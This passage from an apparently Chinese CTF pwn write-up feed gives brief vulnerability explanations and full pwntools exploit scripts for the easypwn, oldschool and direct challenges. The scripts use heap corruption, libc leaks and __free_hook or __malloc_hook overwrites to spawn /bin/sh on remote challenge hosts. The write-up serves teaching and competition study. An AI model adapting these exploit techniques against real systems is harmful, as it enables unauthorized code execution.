class="number">-0x130</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note 0: "</span>)</span><br><span class="line">libc.address = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3C4B78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">free(<span class="number">-1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">free(<span class="number">-1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020C0</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400A66')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>存在off by null漏洞，利用chunk extended，并错位申请到控制同一个堆块的size。并通过伪造size将堆块先后放进fastbin和unsortbin，爆破低4位劫持stdout结构（概率1/16），从而leak出libc地址。并通过UAF修改fastbin的fd，申请到<code>__malloc_hook</code>附近，修改其为onegadget，从而getshell。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easypwn"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = remote(<span class="string">"39.101.184.181"</span>,<span class="string">"10000"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./easypwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x78</span>+p64(<span class="number">0x91</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'1'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x68</span>+p64(<span class="number">0x91</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'1'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x310</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(<span class="number">0x10</span>)+<span class="string">'\xe8\x37\n'</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C56A3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">2</span>])+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#7</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h3 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>菜单题，没有对申请到的数据进行初始化，从而可以leak出libc以及堆地址。</p><p>对mmap申请出来的地址进行edit时，对偏移等条件判断错误，误用了&amp;&amp;，从而可以任意地址写。将<code>__free_hook</code>修改为system地址，并free一个<code>/bin/sh</code>的堆块即可getshell。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./oldschool"</span>)</span><br><span class="line">p = remote(<span class="string">"106.14.214.3"</span>,<span class="string">"2333"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./oldschool"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap_allocate</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"start: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap_edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"7"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Value: "</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap_delete</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5. exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">heap = u32(p.recv(<span class="number">4</span>))<span class="number">-0x160</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">4</span>)</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>))<span class="number">-0x1D870A</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">mmap_allocate(<span class="number">0</span>)</span><br><span class="line">mmap_edit((libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0xe0000000</span>)/<span class="number">4</span>,str(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h3><h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p>2.27环境下的题目。edit时偏移采用有符号整数类型，从而可以输入负数造成溢出，利用该漏洞进行chunk extended，进而获取到两个同一地址的指针，达到任意地址申请的目的。</p><p>readdir时第一次会将目录下全部文件名保存在缓冲区中，通过构造，可以通过修改申请到的堆块size位，将该缓冲区释放，接着再申请到某一文件名后，将该堆块free进unsortbin，从而leak出libc地址。结合上面的任意地址申请，修改<code>__free_hook</code>为system函数地址，进而getshell。</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./direct"</span>)</span><br><span class="line">p = remote(<span class="string">"106.14.214.3"</span>,<span class="string">"1912"</span>)</span><br><span class="line">libc = ELF(<span class="string">"direct"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,off,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Offset: "</span>)</span><br><span class="line">p.sendline(str(off))</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_f</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_f</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">open_f()</span><br><span class="line">close_f()</span><br><span class="line">edit(<span class="number">0xa</span>,<span class="number">-16</span>,<span class="number">0x10</span>,p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0xf8</span>)<span class="comment">#8=a</span></span><br><span class="line">edit(<span class="number">0xa</span>,<span class="number">-8</span>,<span class="number">0xf8</span>,p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">edit(<span class="number">0xa</span>,<span class="number">-8</span>,<span class="number">0xf8</span>,p64(<span class="number">0x101</span>))</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">0xb</span>,<span class="number">-16</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x2A0</span>+<span class="number">0x00008041</span>))</span><br><span class="line">free(<span class="number">0xb</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xc8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">0xe</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0xb</span>)</span><br><span class="line">free(<span class="number">0xc</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0xe8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">0xb</span>)</span><br><span class="line">free(<span class="number">0xc</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0xe</span>,<span class="number">-0x101</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x11</span>)</span><br><span class="line">close_f()</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x11</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0</span>,<span class="number">0x10</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x10</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x910)')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;强网先锋&quot;&gt;&lt;a href=&quot;#强网先锋&quot; class=&quot;headerlink&quot; title=&quot;强网先锋&quot;&gt;&lt;/a&gt;强网先锋&lt;/h2&gt;&lt;h3 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#babymessage&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://nuoye-blog.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>2020CISCN-线上初赛</title>
    <link href="https://nuoye-blog.github.io/2020/08/21/37439286/"/>
    <id>https://nuoye-blog.github.io/2020/08/21/37439286/</id>
    <published>2020-08-21T15:40:00.000Z</published>
    <updated>2020-08-21T15:37:40.478Z</updated>
    
